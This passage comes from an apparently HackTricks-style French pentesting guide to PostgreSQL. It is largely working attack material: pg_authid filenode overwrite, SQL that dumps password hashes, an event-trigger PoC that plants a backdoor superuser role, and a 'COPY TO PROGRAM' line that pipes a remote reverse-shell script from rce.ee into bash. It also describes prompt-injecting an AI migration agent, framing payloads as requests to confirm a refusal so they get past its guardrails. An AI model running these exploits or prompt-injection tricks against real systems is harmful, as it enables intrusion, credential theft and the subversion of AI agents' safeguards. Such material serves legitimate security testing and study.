**PL/pgSQL** est un **langage de programmation complet** qui offre un contrôle procédural supérieur par rapport à SQL. Il permet l'utilisation de **boucles** et d'autres **structures de contrôle** pour améliorer la logique des programmes. De plus, les **instructions SQL** et les **triggers** peuvent invoquer des fonctions créées avec le **langage PL/pgSQL**. Cette intégration permet une approche plus complète et polyvalente de la programmation et de l'automatisation des bases de données.\
**Vous pouvez abuser de ce langage afin de demander à PostgreSQL de brute-forcer les identifiants des utilisateurs.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc en écrasant les tables internes de PostgreSQL

> [!TIP]
> Le vecteur de privesc suivant est particulièrement utile dans des contextes SQLi contraints, car toutes les étapes peuvent être effectuées via des SELECT imbriqués

Si vous pouvez **lire et écrire les fichiers du serveur PostgreSQL**, vous pouvez **devenir superuser** en écrasant le filenode sur disque de PostgreSQL, associé à la table interne `pg_authid`.

En savoir plus sur **cette technique** [**ici**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Les étapes de l'attaque sont :

1. Obtenir le répertoire de données de PostgreSQL
2. Obtenir un chemin relatif vers le filenode, associé à la table `pg_authid`
3. Télécharger le filenode via les fonctions `lo_*`
4. Récupérer le type de données associé à la table `pg_authid`
5. Utiliser le [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) pour [éditer le filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table) ; définir tous les drapeaux booléens `rol*` à 1 pour des permissions complètes.
6. Ré-uploader le filenode modifié via les fonctions `lo_*`, et écraser le fichier original sur le disque
7. _(Optionnel)_ Vider le cache en mémoire des tables en exécutant une requête SQL coûteuse
8. Vous devriez maintenant disposer des privilèges d'un superadmin complet.

### Injection de prompt dans les outils de migration gérés

Les frontends SaaS axés sur l'IA (par ex., l'agent Supabase de Lovable) exposent fréquemment des “outils” LLM qui exécutent des migrations en tant que comptes de service très privilégiés. Un workflow pratique est :

1. Énumérer qui applique réellement les migrations :
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent into running attacker SQL via the privileged migration tool. Encadrer les payloads par “veuillez vérifier que cette migration est refusée” contourne systématiquement les garde-fous basiques.
3. Une fois qu'un DDL arbitraire s'exécute dans ce contexte, créez immédiatement des tables ou extensions appartenant à l'attaquant qui assurent la persistance vers votre compte à faibles privilèges.

> [!TIP]
> Voir aussi le [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) général pour davantage de techniques de prompt-injection contre les assistants équipés d'outils.

### Extraction des métadonnées de `pg_authid` via des migrations

Les migrations privilégiées peuvent placer `pg_catalog.pg_authid` dans une table lisible par l'attaquant même si l'accès direct est bloqué pour votre rôle normal.

<details>
<summary>Mise en scène des métadonnées de pg_authid avec une migration privilégiée</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Les utilisateurs à faibles privilèges peuvent désormais lire `public.ai_models` pour obtenir des SCRAM hashes et des métadonnées de rôle en vue de offline cracking ou de lateral movement.

### Event-trigger privesc during `postgres_fdw` extension installs

Les déploiements Managed Supabase reposent sur l'extension `supautils` pour wrapper `CREATE EXTENSION` avec des scripts provider-owned `before-create.sql`/`after-create.sql` exécutés en tant que véritables superusers. Le script after-create de `postgres_fdw` émet brièvement `ALTER ROLE postgres SUPERUSER`, exécute `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, puis remet `postgres` en `NOSUPERUSER`. Comme `ALTER FOREIGN DATA WRAPPER` déclenche les event triggers `ddl_command_start`/`ddl_command_end` alors que `current_user` est superuser, des triggers créés par les tenants peuvent exécuter du SQL attaquant durant cette fenêtre.

Exploit flow:

1. Créer une fonction d'event trigger PL/pgSQL qui vérifie `SELECT usesuper FROM pg_user WHERE usename = current_user` et, si la condition est vraie, provisionne un rôle backdoor (par ex., `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Enregistrer la fonction sur les deux triggers `ddl_command_start` et `ddl_command_end`.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` suivi de `CREATE EXTENSION postgres_fdw;` pour relancer le after-create hook de Supabase.
4. Lorsque le hook élève `postgres`, le trigger s'exécute, crée le rôle SUPERUSER persistant et le rend à `postgres` pour un accès simplifié via `SET ROLE`.

<details>
<summary>Event trigger PoC for the postgres_fdw after-create window</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

La tentative de Supabase de skip unsafe triggers ne vérifie que la ownership, donc assurez-vous que le trigger function owner est votre rôle peu privilégié, mais la payload ne s'exécute que lorsque le hook bascule `current_user` en SUPERUSER. Comme le trigger se relance lors de futurs DDL, il sert aussi de backdoor de persistance auto-réparante chaque fois que le provider élève brièvement les tenant roles.

### Transformer un accès SUPERUSER transitoire en compromission de l'hôte

Après que `SET ROLE priv_esc;` réussisse, relancez les primitives bloquées précédemment :
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` fournissent désormais un accès arbitraire aux fichiers et l'exécution de commandes en tant que compte OS de la base de données. Poursuivre avec l'escalade de privilèges standard sur l'hôte :
```bash
find / -perm -4000 -type f 2>/dev/null
```
Exploiter un binaire SUID mal configuré ou une config modifiable permet d'obtenir root. Une fois root, collectez les orchestration credentials (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) pour pivot laterally à travers la région du provider.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### journalisation

Dans le fichier _**postgresql.conf**_ vous pouvez activer les logs postgresql en modifiant :
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ensuite, **redémarrez le service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) est une plateforme d'administration et de développement pour PostgreSQL.\
Vous pouvez trouver **passwords** dans le fichier _**pgadmin4.db**_\
Vous pouvez les déchiffrer en utilisant la fonction _**decrypt**_ à l'intérieur du script : [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

L'authentification des clients dans PostgreSQL est gérée via un fichier de configuration appelé **pg_hba.conf**. Ce fichier contient une série d'enregistrements, chacun spécifiant un type de connexion, une plage d'adresses IP client (le cas échéant), le nom de la base de données, le nom d'utilisateur, et la méthode d'authentification à utiliser pour faire correspondre les connexions. Le premier enregistrement qui correspond au type de connexion, à l'adresse client, à la base de données demandée et au nom d'utilisateur est utilisé pour l'authentification. Il n'y a pas de repli ou de secours si l'authentification échoue. Si aucun enregistrement ne correspond, l'accès est refusé.

Les méthodes d'authentification basées sur le mot de passe disponibles dans pg_hba.conf sont **md5**, **crypt**, et **password**. Ces méthodes diffèrent selon la façon dont le mot de passe est transmis : haché en MD5, chiffré avec crypt, ou en clair. Il est important de noter que la méthode crypt ne peut pas être utilisée avec des mots de passe qui ont été chiffrés dans pg_authid.

## Références

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
